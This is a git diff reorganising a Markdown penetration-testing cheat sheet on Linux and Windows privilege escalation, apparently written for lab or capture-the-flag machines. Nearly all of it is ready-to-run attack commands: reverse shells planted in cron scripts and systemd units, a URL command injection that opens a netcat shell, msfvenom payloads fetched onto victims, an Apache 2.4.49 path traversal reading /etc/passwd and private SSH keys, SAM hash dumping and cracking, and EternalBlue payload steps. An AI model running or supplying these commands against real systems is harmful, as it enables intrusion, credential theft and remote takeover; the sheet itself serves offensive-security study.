@@ -146,6 +146,12 @@ unzip backup
 cat dump.sql
 ```
 
+### SSH User Logins and exploits
+```
+ssh -i ssh_key user@192.168.x.x
+Make sure ssh_key is the private key -> public key can show username though
+```
+
 
 
 
@@ -165,6 +171,9 @@ ls /var/www/
 ----------------------------------------------------------------------------------------------------------------
 ### SUDO -L (Permissions)
 EXAMPLE OUTPUT:
+```
+find / -perm -u=s -type f 2>/dev/null
+```
 ```
 #(root) NOPASSWD: /usr/bin/find
 #(root) NOPASSWD: /usr/bin/nmap
@@ -232,24 +241,37 @@ sudo perl -e 'exec "/bin/bash";'
 ```
 More at https://github.com/gurkylee/Linux-Privilege-Escalation-Basics#absuing-sudo-binaries-to-gain-root
 
--------------------------------------------------------------------------------------------------------------------------------------
+### SSH user priv download
+```
+to download a file from kali IF you have SSH access to the machine
 
-### Execute by adding /bin/bash
+scp -i /mnt/user_sshkey user@192.168.2.105:/folder_name/passwordsDB.kdbx .
+scp -i sshKey groundfloor@192.168.2.105:/keepass/passwordsDB.kdbx .
+```
+
+
+-------------------------------------------------------------------------------------------------------------------------------------
+### Web Applications
+- Remember to check service version and use https://www.exploit-db.com/ to find vulnerabilities
+-  Version is usually found using the -sV flag on nmap or IF it has a webpage hosting a CMS, check the webpage for the version running.
+
+### Backup File
+```Navigate to user directory and use ls -lah in backup files to find readable items
+# Look for;
+- processes run as root
+- hashed passwords
+- any processes that give you root access after running
+```
+### Escalate priv by adding /bin/bash to script for a user (need pass or sudo permission)
 ```
 sudo -u user /bin/bash /var/www/html/start.sh
 ```
 ### Escalate by adding nc to cron job
 ```
- The cron service searches its spool area (usually /var/spool/cron/crontabs) for crontab files (which are named after user accounts); cron also reads /etc/crontab, 
+# The cron service searches its spool area (usually /var/spool/cron/crontabs) for crontab files (which are named after user accounts); cron also reads /etc/crontab, 
 echo "nc 192.168.2.x 4444 -e /bin/bash" >> /var/cron/check.sh
 OR
-echo "bash -i >& /dev/tcp/10.8.0.11/3222 0>&1" > /home/skyhigh/cron_script.sh
-```
-### Escalate by checking sudo -l
-```
-sudo -l
-See what commands the user can run
-IF the user can run a file -> go to file location and see if you can edit it to generate a reverse shell
+echo "bash -i >& /dev/tcp/10.8.0.11/3222 0>&1" > /home/user/cron_script.sh
 ```
 ### Low privilege printf command to overwrite file contents
 ```
@@ -259,127 +281,19 @@ printf "[Unit]\nDescription=Custom Setup Service\n\n[Service]\nType=oneshot\nExe
 Change to
 printf "[Unit]\nDescription=Custom Setup Service\n\n[Service]\nType=oneshot\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.101/4444 0>&1'\n\n[Install]\nWantedBy=multi-user.target" > service.name
 
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-sudo systemctl deamon-reload service.name
-sudo systemctl restart 
-
+// python3 -c 'import pty;pty.spawn("/bin/bash")'
+// sudo systemctl deamon-reload service.name
+// sudo systemctl restart 
 ```
-
-### find all files that have SUID bit set
+### MySQL exploitations
 ```
-find / -perm -u=s -type f 2>/dev/null
-https://gtfobins.github.io/
-use this to find binary that will give root based off results of SUID bit search
-```
+# Spawn a shell from
+\!sh mySql - sudo mysql -u root -p
 
-
-### Backup File
-```Navigate to user directory and use ls -lah in backup files to find readable items
-# Look for;
-- processes run as root
-- hashed passwords
-- any processes that give you root access after running
-```
-### Find execute privileges for user currently logged in
-``` sudo -l ```
-### MySQL 
-```
-# Spawn a shell from \!sh mySql - sudo mysql -u root -p
-# Check mysql history for login details - cat .mysql_history'
-
+# Check mysql history for login details 
+cat .mysql_history'
  ```
-### Read Passwd file
-``` cat /etc/passwd ```
-``` If readable -> take password hash of the user: https://www.makeuseof.com/use-hashcat-to-crack-hashes-linux/```
 
-### Upgrade meterpreter shell Windows
-1. Create a windows TCP reverse shell payload executable
-   NOTE when connecting to windows initially use port 80 for reverse shell and use nc -nvlp 80
-```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.49 LPORT=4446 -e x86/shikata_ga_nai -f exe -o reverse.exe```
-OR
-```msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.5 LPORT=4444 -f exe > reverse.exe```
-
-3. Host the payload on a server from our kali machine (in order to download it from the vul-
-nerable machine)
-
-```python -m http.server 8000 ```
-
-3. Download the payload to the vulnerable machine using our powershell reverse shell use
-format Invoke-WebRequest -Uri "http://192.168.56.49:8000/reverse.exe" -Outfile "reverse.exe"
-
-```Invoke-WebRequest http://10.8.0.5:8000/reverse.exe -outfile .\reverse.exe```
-
--NOTE! may have to do this in public directory as its executable
-
-5. Create another netcat listener on our kali machine
-6. Execute the new reverse shell payload and capture the shell
-./reverse.exe
-
-### Reveal vulnerable services on Windows System
-https://medium.com/@dasagreeva/windows-privilege-escalation-methods-2e93c954a287
-
-1 Unquoted Service Paths
-#``` wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ ```
-
-Look for listed unquoted executable paths 
-
-e.g. Vulnerable Service Vulnerable Service C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe Auto
-
-If we drop malicious code to one of these paths, windows will run our exe as system upon restart of service
-
-Check for permissions of folders
-#```icacls “C:\Program Files (x86)\Program Folder”```    
-
-#If (F = Full Control)  -> We can now place a payload into the folder and start of the service it will run as SYSTEM
-
-Place payloads across windows folders
-#```copy C:\Users\Public\reverse.exe ‘C:\Program Files (x86)\IObit\reverse.exe’```
-#```Rename-Item reverse.exe Advanced.exe```
-
-To restart and stop services USE
-#```sc stop ServiceName```
-#```sc start ServiceName```
-
-2 Insecure File/Folder Permissions
-   
-Check permissions for vulnerable service executable path
-#```icacls “C:\Program Files (x86)\Program Folder\A Subfolder”```
-Replace executable.exe with a reverse shell payload and restarting the service
-
-### Run NMAP as root permissions
-``` echo "os.execute('/bin/sh')">/tmp/root.nse```
-```sudo nmap --script=/tmp/root.nse```
- 
-### Export SAM and SYSTEM file to kali machine
-```
-impacket-smbserver share -smb2support -username USER -password PASS
-
-#On windows use net use X: \\10.8.0.3\share /user:USER PASS
-copy Backup\* X:\
-
-Files should be on kali
-dump stored hash from registry files
-
-impacket-secretdump -sam SAM -system SYSTEM LOCAL
-
-Put admin nthash in a file
-
-Use hashcat to crack the hash
-hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt
-
-Use xfreedp or evil-winrm to gain access
-
-evil-winrm -i 192.168.x.x -u Adminstrator -p PASS
-```
-Using Metasploit for above
-After uploading into shares use msfconsole
-```
-use exploit/multi/handler
-set payload generic/shell_reverse_tcp
-set LHOST IP
-set LPORT 4446
-run
-```
 ### Command line injection URL based
 ```
 http://192.168.56.125:8080/administration.php?logfile=chat.txt;%20id
@@ -389,17 +303,182 @@ http://192.168.56.125:8080/administration.php?logfile=cd /home ls
 http://192.168.56.125:8080/administration.php?logfile= chat.txt; nc IP PORT -e /bin/bash
 ```
 
+### Run NMAP as root permissions
+```
+echo "os.execute('/bin/sh')">/tmp/root.nse
+sudo nmap --script=/tmp/root.nse
+```
+
+### Read Passwd file
+```
+cat /etc/passwd
+If readable -> take password hash of the user:
+Follow -> https://www.makeuseof.com/use-hashcat-to-crack-hashes-linux/
+```
+
+### Create password for passwd file
+``` openssl passwd 123 ```
+
+### Overwrite user service with payload
+``` 
+cp /tmp/exploit.sh /usr/local/bin/service.sh
+ ```
+### Find username and password in sql file or similar
+```
+grep -Ei "user|password" dump.sql
+```
+
+### Reveal contents of a file Apache HTTP Server 2.4.49 Exploit- Path Traversal and Remote Code Execution
+```
+# Reveal passwd file
+curl -s --path-as-is -d "echo Content-Type: text/plain;" "192.168.56.125/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+# Reveal private SSH keys for any users found
+curl -s --path-as-is -d "echo Content-Type: text/plain;" "192.168.56.125/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/treehouse/.ssh/id_rsa"
+```
 
 
 
 
+## Escalate Privileges
+## WINDOWS
 
+### Upgrade meterpreter shell Windows
+```
+1. Create a windows TCP reverse shell payload executable
+// NOTE when connecting to windows initially use port 80 for reverse shell and use nc -nvlp 80
 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.49 LPORT=4446 -e x86/shikata_ga_nai -f exe -o reverse.exe
+// OR
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.5 LPORT=4444 -f exe > reverse.exe
 
+3. Host the payload on a server from our kali machine (in order to download it from the vul-
+nerable machine)
 
+python -m http.server 8000 
 
+3. Download the payload to the vulnerable machine using our powershell reverse shell use
+format Invoke-WebRequest OR Curl
+// Uri "http://192.168.56.49:8000/reverse.exe" -Outfile "reverse.exe"
 
+Invoke-WebRequest http://10.8.0.5:8000/reverse.exe -outfile .\reverse.exe
+OR
+curl http://10.8.0.x:8000/rev.exe -o .\rev.exe
 
+// NOTE! may have to do this in public directory as its executable
+
+5. Create another netcat listener on our kali machine
+ 
+6. Execute the new reverse shell payload and capture the shell
+./reverse.exe
+```
+
+### Reveal unquoted service paths
+GUIDE: 
+https://medium.com/@dasagreeva/windows-privilege-escalation-methods-2e93c954a287
+
+```
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
+
+// Look for listed unquoted executable paths 
+
+// e.g. Vulnerable Service Vulnerable Service C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe Auto
+
+// If we drop malicious code to one of these paths, windows will run our exe as system upon restart of service
+
+// Check for permissions of folders
+icacls “C:\Program Files (x86)\Program Folder”
+
+// If (F = Full Control)  -> We can now place a payload into the folder and start of the service it will run as SYSTEM
+
+Place payloads across windows folders
+copy C:\Users\Public\reverse.exe ‘C:\Program Files (x86)\IObit\reverse.exe’
+
+Rename-Item reverse.exe Advanced.exe
+
+// To restart and stop services USE
+sc stop ServiceName
+sc start ServiceName
+```
+
+### Insecure File/Folder Permissions
+```
+// Check permissions for vulnerable service executable path
+
+icacls “C:\Program Files (x86)\Program Folder\A Subfolder”
+
+// Replace executable.exe with a reverse shell payload and restarting the service
+```
+
+### Service enumeration
+```
+# Search Service contents
+systemctl cat service.name.sh```
+# List all services
+systemctl list-unit-files –type=service
+# Restart Service
+sudo systemctl restart service_name.service
+```
+
+### File Capabilities
+```
+File capabilities are certain permissions you can give to binaries.
+Instead of giving a binary ‘sudo’ permission, you can give the binary certain elevated permissions. This is considered
+a safer practise than giving the binary full permissions, as sometimes a binary only needs elevated permissions for a few selected functions.
+https://manpages.ubuntu.com/manpages/lunar/en/man7/capabilities.7.html
+
+# List all file capabilities
+getcap -r / 2>/dev/null
+
+# RSYNC
+rsync is a utility for efficiently transferring and synchronizing files between a computer and a storage drive and across networked computers.
+# Copy files using rsync
+rsync /etc/passwd /home/destination/
+rsync passwd /etc/passwd
+```
+ 
+### Export SAM and SYSTEM file to kali machine
+```
+impacket-smbserver share -smb2support -username USER -password PASS
+
+# On windows use net use X: \\10.8.0.3\share /user:USER PASS
+copy Backup\* X:\
+
+// Files should be on kali
+// dump stored hash from registry files
+
+impacket-secretdump -sam SAM -system SYSTEM LOCAL
+
+// Put admin nthash in a file
+
+// Use hashcat to crack the hash
+hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt
+
+// Use xfreedp or evil-winrm to gain access
+
+evil-winrm -i 192.168.x.x -u Adminstrator -p PASS
+
+OR
+Using Metasploit for above
+After uploading into shares use msfconsole
+
+use exploit/multi/handler
+set payload generic/shell_reverse_tcp
+set LHOST IP
+set LPORT 4446
+run
+```
+
+### Eternal Blue
+```
+#https://github.com/helviojunior/MS17-010
+#Generate payload in exe format and use the send_and_execute.py
+msfvenom -p windows/shel_reverse_tcp EXITFUNC=thread LHOST=IP LPORT=PORT -f exe -o payload.exe
+python2 /opt/MS17-010/send_and_execute.py TARGET_IP payload.exe
+# If this does not work, use the paylaod created by the following commands
+msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=10.10.14.28 LPORT=443 -f raw -o sc_x64_payload.bin
+nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
+cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
+```
 
 ## Payloads
 
@@ -443,7 +522,7 @@ https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20She
 https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php
 ```
 
-###
+### ASPX payload for web 
 ```
 aspx payload for web or  FTP
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=4000 -f aspx > rev.aspx
@@ -469,23 +548,9 @@ Include full passwd file entry in hash
 
 ## Helpful tools
 
-### Services
-```
-#Search Service contents
-systemctl cat service.name.sh```
-# List all services
-systemctl list-unit-files –type=service
-# Restart Service
-sudo systemctl restart service_name.service
-```
-### Create password for passwd file
-``` openssl passwd 123 ```
-### Overwrite user service with payload
-``` cp /tmp/exploit.sh /usr/local/bin/service.sh ```
 ### Decode hash base64
 ``` echo ' HASH '  | base64 -d ```
-### See user sudo privileges
-''' sudo -l ```
+
 ### Hashing types
 ```
 #Mscache V2
@@ -501,60 +566,17 @@ hashcat -m 5600
 #MYSQL file hashes
 mysql-sha1
 ```
-
-### Find username and password in sql file or similar
-```
-grep -Ei "user|password" dump.sql
-```
-
-
-## General Commands
-
-### SSH User Logins and exploits
-```ssh -i ssh_key user@192.168.x.x
-Make sure ssh_key is the private key -> public key can show username though
-
-to download a file from kali IF you have SSH access to the machine
-scp -i /mnt/user_sshkey user@192.168.2.105:/folder_name/passwordsDB.kdbx .
-scp -i sshKey groundfloor@192.168.2.105:/keepass/passwordsDB.kdbx .
-```
 ### File permissions to run
-```chmod 777 OR chmod 600```
-
+```
+chmod 777 OR chmod 600
+chmod +x file_name  - give current user permisson
+```
 
 ## Exploits- Specific Scenarios
 
-### Web Applications
-- Remember to check service version and use https://www.exploit-db.com/ to find vulnerabilities
--  Version is usually found using the -sV flag on nmap or IF it has a webpage hosting a CMS, check the webpage for the version running.
-
-### Reveal contents of a file Apache HTTP Server 2.4.49 Exploit- Path Traversal and Remote Code Execution
-```
-# Reveal passwd file
-curl -s --path-as-is -d "echo Content-Type: text/plain;" "192.168.56.125/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
-# Reveal private SSH keys for any users found
-curl -s --path-as-is -d "echo Content-Type: text/plain;" "192.168.56.125/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/treehouse/.ssh/id_rsa"
-```
-### File Capabilities
-```
-File capabilities are certain permissions you can give to binaries.
-Instead of giving a binary ‘sudo’ permission, you can give the binary certain elevated permissions. This is considered
-a safer practise than giving the binary full permissions, as sometimes a binary only needs elevated permissions for a few selected functions.
-https://manpages.ubuntu.com/manpages/lunar/en/man7/capabilities.7.html
-
-# List all file capabilities
-getcap -r / 2>/dev/null
-
-# RSYNC
-rsync is a utility for efficiently transferring and synchronizing files between a computer and a storage drive and across networked computers.
-# Copy files using rsync
-rsync /etc/passwd /home/destination/
-rsync passwd /etc/passwd
-```
-
 ### CMS Made Simple 2.2.5 Authenticated Remote Code Execution
 ```
-#Enumerate the directories
+# Enumerate the directories
 dirb http://192.168.56.126/   -> make sure to include the directed page e.g /cmsms/ as URL
 Visit and follow
 https://www.exploit-db.com/exploits/44976
@@ -588,20 +610,9 @@ Connect by entering localhost into browser on kali
 ### Wordpress non public exploit
 ```
 if able to login to the admin panel
-go to apperance and select 404.php, replace content with reverse shell payload, setup listener, go to nonexisting page
+go to appearance and select 404.php, replace content with reverse shell payload, setup listener, go to nonexisting page
 plugin shell upload
 https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
-```
-### Eternal Blue
-```
-#https://github.com/helviojunior/MS17-010
-#Generate payload in exe format and use the send_and_execute.py
-msfvenom -p windows/shel_reverse_tcp EXITFUNC=thread LHOST=IP LPORT=PORT -f exe -o payload.exe
-python2 /opt/MS17-010/send_and_execute.py TARGET_IP payload.exe
-# If this does not work, use the paylaod created by the following commands
-msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=10.10.14.28 LPORT=443 -f raw -o sc_x64_payload.bin
-nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
-cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
 ```
 
 ### Dirty cow
@@ -625,7 +636,6 @@ On Kali download an epxloit suggestion and have it in same directory as hosting 
 wget http://10.8.0.131/39166.c
 Run exploit using instructions
 ```
-
 
 ### Golden ticket method
 ```
